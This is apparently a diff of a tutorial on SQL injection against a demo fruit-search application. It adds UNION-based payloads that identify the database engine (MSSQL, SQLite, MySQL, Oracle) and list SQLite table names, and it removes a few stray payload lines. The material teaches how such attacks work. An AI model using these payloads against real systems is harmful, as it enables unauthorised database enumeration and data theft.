@@ -25,18 +25,18 @@ which is invalid SQL. Now that you know there is a sql injection vulnerability, 
 
 But first you need to know what database you are dealing with. SQL Server, vs Oracle, vs MySQL, etc., will all have different ways of interrogating the database for table names. You can use the following input to determine the database type:
 
-    xyz' UNION SELECT @@version; --
+    xyz' UNION SELECT @@version; -- MSSQL
+    Or...
+    xyz' UNION SELECT sqlite_version(); -- SQLite
+    Or...
+    xyz' UNION SELECT version(); -- MySQL
+    Or...
+    xyz' UNION SELECT banner FROM v$version; -- Oracle
 
 A UNION attack can be very effective for gleaning database internals. UNION allows you to concatenate query results from disparate tables and views as long as the number of fields and data types match. Knowing this you craft a Search like this:
 
-    xyz' UNION SELECT [name] FROM sys.tables; --
+    xyz' UNION SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name; --
 
 This input will append the table names to the result of the fruit search and comment out anything that might be after the original LIKE clause.
 
 ![Tables](/images/tables.png)
-
-xyz' UNION SELECT sqlite_version(); --
-
-xyz' UNION SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name; --
-
-xyz' UNION SELECT name FROM pragma_table_info('Fruit'); --
